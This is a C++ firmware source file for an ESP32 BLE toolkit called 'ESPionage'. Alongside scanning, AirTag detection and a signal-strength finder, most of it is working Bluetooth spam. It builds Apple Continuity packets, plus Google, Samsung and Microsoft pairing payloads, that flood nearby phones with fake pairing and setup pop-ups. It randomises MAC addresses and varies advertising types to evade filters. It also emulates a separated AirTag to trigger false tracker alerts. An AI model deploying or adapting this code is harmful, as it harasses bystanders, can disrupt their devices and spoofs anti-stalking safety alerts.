#include "ble_tools.h"
#include "config.h"
#include "activity.h"
#include <NimBLEDevice.h>
#include <freertos/FreeRTOS.h>
#include <freertos/semphr.h>
#include <vector>
#include <map>
#include <math.h>

namespace BleTools {

// -------- Scan --------
struct BleDev {
  String mac;
  String name;
  int rssi;
  String manuf;
};
static std::vector<BleDev> scanResults;
static SemaphoreHandle_t   scanMutex  = nullptr; // guards scanResults
static NimBLEScan *scanner    = nullptr;
static bool scanActive        = false;  // intent: user wants scan running
static bool scanActuallyOn    = false;  // NimBLE is actually scanning
static bool bleInitialized    = false;
static bool scanAwaitingRetry = false;  // waiting millis-based delay before retry
static unsigned long scanRetryAt = 0;  // millis() time to retry start
static String appleDeviceCacheJson;    // pre-built at init() to avoid per-request work

// -------- Spam --------
static SpamVendor currentVendor = SPAM_APPLE;
static bool spamActive = false;
static unsigned long lastSpam = 0;
static uint32_t spamCount = 0;
static int spamInterval = 100;
static int  appleSpamIdx = -1;  // -1 = random, >=0 = locked to that device

// -------- AirTag detection --------
static bool airtagActive = false;
static std::map<String, uint32_t> airtagSeen;
static uint32_t airtagFollowerCount = 0;

// -------- Finder --------
struct BleFinder {
  bool active = false;
  String targetMac;
  int measuredPower = FINDER_MEASURED_POWER_BLE;
  float n = FINDER_PATH_LOSS_N;
  int lastRssi = -127;
  float emaRssi = -70;
  float prevEma = -70;
  int samplesSince = 0;
  float estMeters = -1;
  float trend = 0;
};
static BleFinder finder;

// -------- Custom advertiser --------
static bool customAdvActive = false;
static String customAdvName = "";

// ── Apple BLE Continuity payloads — iOS 18 compatible ────────────────────────
// Rewritten using the packet structures from:
//   l33tfg/iOS-BLE-Proximity-Attack-ESP32 (iOS 18 confirmed)
//   ckcr4lyf/EvilAppleJuice-ESP32 (packet format source)
//   simondankelmann/Bluetooth-LE-Spam (action modal codes)
//
// Two packet types:
//   AUDIO (false): 31-byte Proximity Pairing type 0x07
//                  Triggers earbuds/headphone popup. Needs closer range (~3m).
//   SETUP (true):  23-byte Action Modal (type 0x04 + 0x0F combined)
//                  Triggers "Setup New Device" action sheets. Works at longer range.

struct AppleDevice {
  const char *name;
  uint8_t     modelId;
  bool        isSetup;   // false=AUDIO (proximity pairing), true=SETUP (action modal)
};

// Build an Apple advertisement packet into buf; returns packet length.
// Must be called with buf[0..30] pre-zeroed (or caller handles length).
static size_t buildApplePacket(const AppleDevice& dev, uint8_t *buf) {
  memset(buf, 0, 31);
  if (!dev.isSetup) {
    // AUDIO — 31-byte Proximity Pairing (Continuity type 0x07)
    // Updated body from EvilAppleJuice-ESP32 — the 0x07 flag byte at [6]
    // and the body bytes are what iOS 17/18 checks against its validation list.
    static const uint8_t header[] = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07};
    static const uint8_t body[]   = {0x20,0x75,0xaa,0x30,0x01,0x00,0x00,
                                     0x45,0x12,0x12,0x12};
    memcpy(buf,     header, sizeof(header));
    buf[7] = dev.modelId;
    memcpy(buf + 8, body,   sizeof(body));
    return 31;
  } else {
    // SETUP — 23-byte Action Modal
    // Prefix embeds both type 0x04 (Nearby Action) and type 0x0F (NearbyAction)
    // in a single manufacturer-specific AD structure. Discovered by simondankelmann.
    // The auth bytes at [14..16] don't need to be valid — iOS ignores them.
    static const uint8_t prefix[] = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,
                                      0x00,0x00,0x0f,0x05,0xc1};
    static const uint8_t suffix[] = {0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
    memcpy(buf,      prefix, sizeof(prefix));
    buf[13] = dev.modelId;
    memcpy(buf + 14, suffix, sizeof(suffix));
    return 23;
  }
}

static const AppleDevice APPLE_DEVICES[] = {
  // ── Audio (Proximity Pairing type 0x07) ────────────────────────────────────
  // Triggers the white earbuds pairing popup on nearby iPhones.
  // Range-sensitive: works best within ~3m. iOS 14–18 confirmed.
  {"AirPods",             0x02, false},
  {"Power Beats",         0x03, false},
  {"Beats X",             0x05, false},
  {"Beats Solo 3",        0x06, false},
  {"Beats Studio 3",      0x09, false},
  {"AirPods Max",         0x0a, false},
  {"Power Beats Pro",     0x0b, false},
  {"Beats Solo Pro",      0x0c, false},
  {"AirPods Pro",         0x0e, false},
  {"AirPods Gen 2",       0x0f, false},
  {"Beats Flex",          0x10, false},
  {"Beats Studio Buds",   0x11, false},
  {"Beats Fit Pro",       0x12, false},
  {"AirPods Gen 3",       0x13, false},
  {"AirPods Pro 2",       0x14, false},
  {"Beats Studio Buds+",  0x16, false},
  {"Beats Studio Pro",    0x17, false},
  {"AirPods Pro 2 USB-C", 0x24, false},
  {"Beats Solo 4",        0x25, false},
  {"Beats Solo Buds",     0x26, false},
  {"Software Update",     0x2e, false},
  {"Powerbeats Fit",      0x2f, false},
  // ── Setup / Action Modal (type 0x04 + 0x0F) ────────────────────────────────
  // Triggers "Setup New Device" / action sheets. Longer range than audio.
  // New action codes from simondankelmann confirmed on iOS 16/17/18.
  {"AppleTV Setup",       0x01, true},
  {"Transfer Number",     0x02, true},
  {"AppleID for AppleTV", 0x05, true},
  {"Join This AppleTV",   0x06, true},
  {"Setup New iPhone",    0x09, true},
  {"HomePod Setup",       0x0b, true},
  {"AppleTV Homekit",     0x0d, true},
  {"AppleTV Keyboard",    0x13, true},
  {"Pair AppleTV",        0x19, true},
  {"TV Color Balance",    0x1e, true},
  {"Apple Watch Setup",   0x20, true},
  {"Connect to Device",   0x21, true},
  {"Apple Vision Pro",    0x24, true},
  {"AppleTV Network",     0x27, true},
  {"AppleTV AutoFill",    0x2b, true},
  {"Software Update",     0x2f, true},
  {"AppleTV Audio Sync",  0xc0, true},
};
static const int APPLE_COUNT = sizeof(APPLE_DEVICES) / sizeof(APPLE_DEVICES[0]);

struct GooglePayload {
  const char *name;
  uint32_t modelId;
};
static const GooglePayload GOOGLE_PAYLOADS[] = {
  {"Pixel Buds",       0x000006},
  {"Pixel Buds A",     0x0000F0},
  {"Bose QC35",        0x00A168},
  {"JBL Flip 6",       0x001494},
  {"Sony WH-1000XM4",  0x0099CC},
  {"Sony WF-1000XM4",  0x0002F0},
  {"Sony Link Buds",   0x00ABAD},
  {"JBL Live 300",     0x0000BE},
  {"LG HBS",           0x000047},
  {"Razer Hammerhead", 0x00072F},
};
static const int GOOGLE_COUNT = sizeof(GOOGLE_PAYLOADS) / sizeof(GOOGLE_PAYLOADS[0]);

static const uint8_t MS_SWIFT_PAIR[] = {
  0x06, 0xFF, 0x06, 0x00, 0x03, 0x00, 0x80
};

static void buildSamsungPayload(uint8_t *out, size_t &outLen) {
  uint8_t buf[] = {
    0x0F, 0xFF, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02,
    0x14, 0x15, 0x03, 0x21, 0x01, 0x09, 0xEF, 0x02
  };
  buf[11] = random(0, 0xFF);
  buf[13] = random(0, 0xFF);
  memcpy(out, buf, sizeof(buf));
  outLen = sizeof(buf);
}

// -------- Scan callback --------
// BLE_SCAN_BURST_SECS: how long each NimBLE scan burst runs.
// Keeping it short (8s) means NimBLE's host task gives the WiFi/lwIP stack
// regular gaps to breathe. Indefinite scans (duration=0) cause NimBLE to
// monopolise Core 0 once device density gets high, starving the WebSocket.
#define BLE_SCAN_BURST_SECS  8
// Gap between bursts (ms) — WiFi recovery window.
#define BLE_SCAN_PAUSE_MS  2000

class ScanCallbacks : public NimBLEScanCallbacks {
  void onResult(const NimBLEAdvertisedDevice *dev) override {
    String mac = String(dev->getAddress().toString().c_str());
    int rssi = dev->getRSSI();

    // Finder: match the tracked device
    if (finder.active && mac.equalsIgnoreCase(finder.targetMac)) {
      finder.lastRssi = rssi;
      finder.emaRssi = 0.35f * rssi + 0.65f * finder.emaRssi;
      finder.estMeters = powf(10.0f,
        (finder.measuredPower - finder.emaRssi) / (10.0f * finder.n));
      finder.samplesSince++;
      if (finder.samplesSince > 4) {
        finder.trend = finder.emaRssi - finder.prevEma;
        finder.prevEma = finder.emaRssi;
        finder.samplesSince = 0;
      }
    }

    // Build the entry before taking the mutex (getName() etc. are safe here)
    BleDev d;
    d.mac  = mac;
    d.name = dev->haveName() ? String(dev->getName().c_str()) : "";
    d.rssi = rssi;
    if (dev->haveManufacturerData()) {
      std::string m = dev->getManufacturerData();
      if (m.length() >= 2) {
        uint16_t cid = ((uint8_t)m[1] << 8) | (uint8_t)m[0];
        switch (cid) {
          case 0x004C: d.manuf = "Apple";     break;
          case 0x0006: d.manuf = "Microsoft"; break;
          case 0x0075: d.manuf = "Samsung";   break;
          case 0x00E0: d.manuf = "Google";    break;
          default: d.manuf = "0x" + String(cid, HEX); break;
        }
      }
    }

    // Mutex-protected write to scanResults
    if (scanMutex && xSemaphoreTake(scanMutex, pdMS_TO_TICKS(10)) == pdTRUE) {
      bool found = false;
      for (auto& existing : scanResults) {
        if (existing.mac == mac) { existing.rssi = rssi; found = true; break; }
      }
      if (!found && scanResults.size() < MAX_BLE_RESULTS) {
        scanResults.push_back(d);
      }
      xSemaphoreGive(scanMutex);
    }
  }

  // Called by NimBLE when the burst scan ends (timeout or explicit stop).
  // Runs from the NimBLE host task on Core 0 — only touch simple flags here.
  void onScanEnd(const NimBLEScanResults& results, int reason) override {
    scanActuallyOn = false;
    if (scanActive) {
      // Schedule next burst after a pause to let WiFi/lwIP recover
      scanAwaitingRetry = true;
      scanRetryAt = millis() + BLE_SCAN_PAUSE_MS;
    }
  }
};
static ScanCallbacks scanCb;

// ---------------------------------------------------------------- init
void init() {
  scanResults.reserve(MAX_BLE_RESULTS);
  scanMutex = xSemaphoreCreateMutex();

  // Pre-initialize NimBLE at boot from the main task (Core 1).
  // Doing it lazily from an async HTTP handler (Core 0) can block the
  // WiFi/network task and make the device appear hung.
  if (!NimBLEDevice::isInitialized()) {
    NimBLEDevice::init("ESPionage");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
  }
  bleInitialized = true;

  // Pre-build the apple device list JSON once at boot (it never changes).
  // /api/apple-devices will return this cached string instead of rebuilding every request.
  // Categories: "audio" = Proximity Pairing (earbuds popup), "setup" = Action Modal (sheets)
  String out = "[";
  for (int i = 0; i < APPLE_COUNT; i++) {
    if (i) out += ",";
    const char* cat = APPLE_DEVICES[i].isSetup ? "setup" : "audio";
    out += "{\"idx\":" + String(i) +
           ",\"name\":\"" + String(APPLE_DEVICES[i].name) + "\"" +
           ",\"cat\":\"" + cat + "\"}";
  }
  out += "]";
  appleDeviceCacheJson = out;
}

static void ensureBleInit() {
  // NimBLE is now always pre-initialized in init(), but keep guard for safety.
  if (bleInitialized) return;
  if (!NimBLEDevice::isInitialized()) {
    NimBLEDevice::init("ESPionage");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
  }
  bleInitialized = true;
}

// ---------------------------------------------------------------- Scan
// startScan() is called from the async HTTP handler (Core 0 / WiFi task).
// All actual NimBLE calls (which block on HCI responses) happen in tickScan()
// which runs from the Arduino main loop on Core 1. This avoids blocking
// the lwIP/WiFi task and causing WebSocket drops / apparent hangs.
void startScan() {
  // Just set the intent flag and clear results — no NimBLE calls here.
  if (scanMutex) xSemaphoreTake(scanMutex, portMAX_DELAY);
  scanResults.clear();
  if (scanMutex) xSemaphoreGive(scanMutex);

  scanActive = true;
  Activity::log("scan", "BLE scan requested");
}

void stopScan() {
  // Just clear the intent flag — tickScan() will call scanner->stop() from Core 1.
  // Calling scanner->stop() directly here (from the HTTP/Core 0 task) can
  // block on HCI and starve the WiFi driver.
  scanActive = false;
}

void tickScan() {
  if (!scanActive) {
    // If mode was stopped externally, make sure NimBLE scan is also off
    if (scanActuallyOn && scanner) {
      scanner->stop();
      scanActuallyOn = false;
    }
    scanAwaitingRetry = false;
    return;
  }

  if (scanActuallyOn) return; // already running, nothing to do

  unsigned long now = millis();

  // Millis-based retry / burst restart: waiting for the pause window to expire
  if (scanAwaitingRetry) {
    if (now < scanRetryAt) return; // still in pause
    // Ensure scanner is initialized before retry
    if (!scanner) {
      scanner = NimBLEDevice::getScan();
      scanner->setScanCallbacks(&scanCb, false);
      scanner->setActiveScan(true);
      scanner->setInterval(100);
      scanner->setWindow(99);
    }
    bool ok = scanner->start(BLE_SCAN_BURST_SECS, false);
    if (ok) {
      scanActuallyOn = true;
      scanAwaitingRetry = false;
      Serial.printf("[BLE] scan burst restarted (%ds)\n", BLE_SCAN_BURST_SECS);
    } else {
      scanRetryAt = now + 500; // back off further
      Serial.println("[BLE] scan restart failed, waiting 500ms");
    }
    return;
  }

  // ---- First attempt: Start the actual scan from Core 1 (safe for NimBLE HCI calls) ----
  ensureBleInit();

  // Stop any active advertising before scanning — ble_gap_disc() returns
  // BLE_HS_EBUSY if an advert is running on the same controller.
  NimBLEDevice::getAdvertising()->stop();
  // No delay() here — NimBLE stop is synchronous; just proceed immediately.

  if (!scanner) {
    scanner = NimBLEDevice::getScan();
    scanner->setScanCallbacks(&scanCb, false);
    scanner->setActiveScan(true);
    scanner->setInterval(100);
    scanner->setWindow(99);
  }

  // Burst scan: BLE_SCAN_BURST_SECS seconds then pause BLE_SCAN_PAUSE_MS ms.
  // onScanEnd() fires when the burst ends and schedules the next burst via
  // scanRetryAt — this gives the WiFi/lwIP stack a regular recovery window
  // instead of letting NimBLE monopolise Core 0 indefinitely.
  bool ok = scanner->start(BLE_SCAN_BURST_SECS, false);
  if (ok) {
    scanActuallyOn = true;
    Serial.printf("[BLE] scan burst started (%ds)\n", BLE_SCAN_BURST_SECS);
  } else {
    // Schedule non-blocking retry in 300ms instead of delay(300)
    scanAwaitingRetry = true;
    scanRetryAt = now + 300;
    Serial.println("[BLE] scan start failed, retry in 300ms");
  }
  if (ok) Activity::log("scan", "BLE scan started");
}

String scanResultsJson() {
  JsonDocument doc;
  JsonArray arr = doc.to<JsonArray>();
  if (scanMutex && xSemaphoreTake(scanMutex, pdMS_TO_TICKS(50)) == pdTRUE) {
    for (auto& d : scanResults) {
      JsonObject o = arr.add<JsonObject>();
      o["mac"]   = d.mac;
      o["name"]  = d.name;
      o["rssi"]  = d.rssi;
      o["manuf"] = d.manuf;
    }
    xSemaphoreGive(scanMutex);
  }
  String out; serializeJson(doc, out); return out;
}

void fillStatus(JsonDocument& doc) {
  if (scanMutex && xSemaphoreTake(scanMutex, pdMS_TO_TICKS(10)) == pdTRUE) {
    doc["count"] = (int)scanResults.size();
    xSemaphoreGive(scanMutex);
  } else {
    doc["count"] = 0;
  }
  doc["scanning"] = scanActuallyOn;
}

// ---------------------------------------------------------------- Spam
static NimBLEAdvertising *adv = nullptr;

void startSpam(SpamVendor v, const JsonDocument& params, int appleIdx) {
  ensureBleInit();
  currentVendor = v;
  spamActive = true;
  spamCount = 0;
  spamInterval = params["interval"] | 100;
  appleSpamIdx = appleIdx;
  adv = NimBLEDevice::getAdvertising();
  const char* names[] = {"Apple", "Google", "Samsung", "Microsoft", "Mix"};
  if (v == SPAM_APPLE && appleIdx >= 0 && appleIdx < APPLE_COUNT) {
    Activity::log("spam", String("Apple Juice: ") + APPLE_DEVICES[appleIdx].name);
  } else {
    Activity::log("spam", String("BLE spam started: ") + names[(int)v]);
  }
}

void stopSpam() {
  if (!spamActive) return;
  spamActive = false;
  if (adv) adv->stop();
}

static void randomizeAddr() {
  uint8_t mac[6];
  for (int i = 0; i < 6; i++) mac[i] = random(0, 0xFF);
  mac[5] |= 0xC0;
  NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
  NimBLEAddress addr(mac, BLE_ADDR_RANDOM);
  ble_hs_id_set_rnd(mac);
}

static size_t buildVendorPayload(SpamVendor v, uint8_t *payload) {
  switch (v) {
    case SPAM_APPLE: {
      int idx = (appleSpamIdx >= 0 && appleSpamIdx < APPLE_COUNT)
                  ? appleSpamIdx
                  : random(0, APPLE_COUNT);
      return buildApplePacket(APPLE_DEVICES[idx], payload);
    }
    case SPAM_GOOGLE: {
      const GooglePayload& p = GOOGLE_PAYLOADS[random(0, GOOGLE_COUNT)];
      payload[0] = 0x03; payload[1] = 0x03; payload[2] = 0x2C; payload[3] = 0xFE;
      payload[4] = 0x06; payload[5] = 0x16; payload[6] = 0x2C; payload[7] = 0xFE;
      payload[8]  = (p.modelId >> 16) & 0xFF;
      payload[9]  = (p.modelId >> 8) & 0xFF;
      payload[10] = p.modelId & 0xFF;
      return 11;
    }
    case SPAM_SAMSUNG: {
      size_t len;
      buildSamsungPayload(payload, len);
      return len;
    }
    case SPAM_MICROSOFT: {
      memcpy(payload, MS_SWIFT_PAIR, sizeof(MS_SWIFT_PAIR));
      return sizeof(MS_SWIFT_PAIR);
    }
    default: return 0;
  }
}

void tickSpam() {
  if (!spamActive || !adv) return;
  if (millis() - lastSpam < (unsigned long)spamInterval) return;
  lastSpam = millis();

  adv->stop();
  randomizeAddr();

  NimBLEAdvertisementData advData;
  uint8_t payload[40];
  size_t payloadLen = 0;

  SpamVendor v = currentVendor;
  if (v == SPAM_MIX) {
    // Rotate through all 4 vendors to hit every phone type nearby
    static int mixIdx = 0;
    v = (SpamVendor)(mixIdx % 4);
    mixIdx++;
  }
  payloadLen = buildVendorPayload(v, payload);

  if (payloadLen > 0) {
    // For Apple spam: randomly vary the PDU advertising type each burst.
    // iOS checks for ADV_IND, ADV_SCAN_IND, and ADV_NONCONN_IND — cycling
    // through all three increases the hit rate and evades some filters.
    // This is the key iOS 18 improvement from l33tfg/iOS-BLE-Proximity-Attack-ESP32.
    if (v == SPAM_APPLE) {
      int choice = random(3);
      if (choice == 0) {
        adv->setConnectableMode(BLE_GAP_CONN_MODE_UND); // ADV_IND
        adv->setDiscoverableMode(BLE_GAP_DISC_MODE_GEN);
      } else if (choice == 1) {
        adv->setConnectableMode(BLE_GAP_CONN_MODE_NON); // ADV_SCAN_IND
        adv->setDiscoverableMode(BLE_GAP_DISC_MODE_GEN);
      } else {
        adv->setConnectableMode(BLE_GAP_CONN_MODE_NON); // ADV_NONCONN_IND
        adv->setDiscoverableMode(BLE_GAP_DISC_MODE_NON);
      }
    }
    advData.addData(payload, payloadLen);
    adv->setAdvertisementData(advData);
    adv->start();
    spamCount++;
  }
}

void fillSpamStatus(JsonDocument& doc) {
  doc["sent"] = (uint32_t)spamCount;
  doc["vendor"] = (int)currentVendor;
  doc["interval"] = spamInterval;
  doc["appleIdx"] = appleSpamIdx;
  if (spamActive && currentVendor == SPAM_APPLE &&
      appleSpamIdx >= 0 && appleSpamIdx < APPLE_COUNT) {
    doc["appleName"] = APPLE_DEVICES[appleSpamIdx].name;
  }
}

String appleDeviceListJson() {
  // Returns pre-built [{idx,name,cat},...] — built once at init()
  return appleDeviceCacheJson;
}

// ---------------------------------------------------------------- AirTag detect
class AirtagScanCb : public NimBLEScanCallbacks {
  void onResult(const NimBLEAdvertisedDevice *dev) override {
    if (!dev->haveManufacturerData()) return;
    std::string m = dev->getManufacturerData();
    if (m.length() < 4) return;
    uint16_t cid = ((uint8_t)m[1] << 8) | (uint8_t)m[0];
    if (cid != 0x004C) return;
    if ((uint8_t)m[2] != 0x12) return;

    String mac = String(dev->getAddress().toString().c_str());
    uint32_t now = millis();

    if (!airtagSeen.count(mac)) {
      airtagSeen[mac] = now;
      Activity::log("alert", "AirTag detected: " + mac);
    } else {
      if (now - airtagSeen[mac] > 180000UL) {
        airtagFollowerCount++;
      }
    }
  }
};
static AirtagScanCb airtagCb;

void startAirtagDetect() {
  ensureBleInit();
  airtagSeen.clear();
  airtagFollowerCount = 0;
  airtagActive = true;
  scanner = NimBLEDevice::getScan();
  scanner->setScanCallbacks(&airtagCb, false);
  scanner->setActiveScan(true);
  scanner->start(0, false, true);
  Activity::log("scan", "AirTag detector started");
}

void stopAirtagDetect() {
  if (!airtagActive) return;
  airtagActive = false;
  if (scanner) scanner->stop();
}

void tickAirtagDetect() {}

void fillAirtagStatus(JsonDocument& doc) {
  doc["unique"] = (int)airtagSeen.size();
  doc["followers"] = (uint32_t)airtagFollowerCount;
}

// ---------------------------------------------------------------- Finder
void startFinder(const JsonDocument& params) {
  ensureBleInit();
  finder.active = true;
  finder.targetMac = String((const char*)(params["mac"] | ""));
  finder.lastRssi = -127;
  finder.emaRssi = -70;
  finder.prevEma = -70;
  finder.estMeters = -1;
  finder.samplesSince = 0;
  finder.trend = 0;

  scanner = NimBLEDevice::getScan();
  scanner->setScanCallbacks(&scanCb, false);
  scanner->setActiveScan(true);
  scanner->setInterval(60);
  scanner->setWindow(55);
  scanner->start(0, false, true);
  Activity::log("scan", "BLE finder locked on " + finder.targetMac);
}

void stopFinder() {
  finder.active = false;
  if (scanner) scanner->stop();
}

void tickFinder() {}

void finderCalibrate() {
  if (!finder.active || finder.lastRssi == -127) return;
  finder.measuredPower = (int)finder.emaRssi;
  Activity::log("info", "BLE finder calibrated at " + String(finder.measuredPower) + " dBm");
}

void finderSetEnv(float n) {
  finder.n = n;
}

void fillFinderStatus(JsonDocument& doc) {
  doc["mac"] = finder.targetMac;
  doc["rssi"] = finder.lastRssi;
  doc["ema"] = (int)finder.emaRssi;
  doc["meters"] = finder.estMeters;
  doc["trend"] = finder.trend;
  doc["mp"] = finder.measuredPower;
  doc["n"] = finder.n;
}

// ---------------------------------------------------------------- Custom advertiser
void startCustomAdv(const JsonDocument& params) {
  ensureBleInit();
  customAdvName = String((const char*)(params["name"] | "ESPionage"));
  customAdvActive = true;

  adv = NimBLEDevice::getAdvertising();
  adv->stop();

  NimBLEAdvertisementData advData;
  advData.setName(customAdvName.c_str());
  advData.setFlags(0x06);
  adv->setAdvertisementData(advData);
  adv->start();
  Activity::log("info", "Custom BLE advertiser: " + customAdvName);
}

void stopCustomAdv() {
  if (!customAdvActive) return;
  customAdvActive = false;
  if (adv) adv->stop();
}

void fillCustomAdvStatus(JsonDocument& doc) {
  doc["name"] = customAdvName;
}

// ---------------------------------------------------------------- AirTag emulation
// Sends a FindMy (type 0x12) or Proximity Pairing advertisement that makes
// nearby iPhones/iPads show "AirTag Found" or pairing notifications.
// The 22-byte "public key" is randomised — real AirTags use a proper EC P-224 key,
// but the advertisement format is enough to trigger iOS FindMy UI.
// -------------------------------------------------------------------------
static bool       atEmuActive    = false;
static uint32_t   atEmuCount     = 0;
static unsigned long atEmuLast   = 0;
static int        atEmuInterval  = 2000; // ms between ads (2s = separated AirTag cadence)
static char       atEmuName[64]  = "AirTag";

static void atEmuRandomizeMac() {
  uint8_t mac[6];
  for (int i = 0; i < 6; i++) mac[i] = random(0, 0xFF);
  mac[5] |= 0xC0; // random static address bits
  NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
  NimBLEAddress addr(mac, BLE_ADDR_RANDOM);
  ble_hs_id_set_rnd(mac);
}

void startAirtagEmulation(const JsonDocument& params) {
  ensureBleInit();
  atEmuActive   = true;
  atEmuCount    = 0;
  atEmuInterval = params["interval"] | 2000;
  const char* name = params["name"] | "AirTag";
  strncpy(atEmuName, name, sizeof(atEmuName) - 1);
  atEmuName[sizeof(atEmuName) - 1] = '\0';
  if (!adv) adv = NimBLEDevice::getAdvertising();
  Activity::log("emu", String("AirTag emulation started: ") + atEmuName);
}

void stopAirtagEmulation() {
  if (!atEmuActive) return;
  atEmuActive = false;
  if (adv) adv->stop();
  Activity::log("emu", "AirTag emulation stopped");
}

void tickAirtagEmulation() {
  if (!atEmuActive || !adv) return;
  if (millis() - atEmuLast < (unsigned long)atEmuInterval) return;
  atEmuLast = millis();

  adv->stop();
  atEmuRandomizeMac();

  // Build Apple FindMy advertisement (type 0x12, 25-byte payload)
  // Byte layout (after manufacturer header 0xFF 0x4C 0x00):
  //   0x12 = FindMy type
  //   0x19 = payload length (25 bytes)
  //   0x10 = status: Separated from owner (bit 4 set)
  //   [22 bytes] = fake EC P-224 public key (randomised)
  //   0x00 = hint (last 2 bits of first key byte, set 0)
  //   [counter] = 15-minute counter (randomised)
  uint8_t key[22];
  for (int i = 0; i < 22; i++) key[i] = random(0, 0xFF);

  uint8_t payload[31];
  int idx = 0;
  payload[idx++] = 0x1E; // length = 30
  payload[idx++] = 0xFF; // manufacturer specific
  payload[idx++] = 0x4C; // Apple OUI low
  payload[idx++] = 0x00; // Apple OUI high
  payload[idx++] = 0x12; // FindMy type
  payload[idx++] = 0x19; // payload length = 25
  payload[idx++] = 0x10; // status: separated
  for (int i = 0; i < 22; i++) payload[idx++] = key[i];
  payload[idx++] = (key[0] >> 6) & 0x03; // hint = upper 2 bits of first key byte
  payload[idx++] = (uint8_t)(millis() / 900000UL); // ~15 min counter

  NimBLEAdvertisementData advData;
  advData.addData(payload, idx);

  // Also set a local name so it appears with the given name in BLE scanners
  adv->setScanResponseData(NimBLEAdvertisementData());
  NimBLEAdvertisementData sr;
  sr.setName(atEmuName);
  adv->setScanResponseData(sr);

  adv->setAdvertisementData(advData);
  adv->start();
  atEmuCount++;
}

void fillAirtagEmulationStatus(JsonDocument& doc) {
  doc["active"] = atEmuActive;
  doc["count"]  = atEmuCount;
  doc["name"]   = atEmuName;
}

// ---------------------------------------------------------------- Clear
void clearLogs() {
  if (scanMutex) xSemaphoreTake(scanMutex, portMAX_DELAY);
  scanResults.clear();
  if (scanMutex) xSemaphoreGive(scanMutex);
  airtagSeen.clear();
  airtagFollowerCount = 0;
  spamCount = 0;
}

} // namespace BleTools
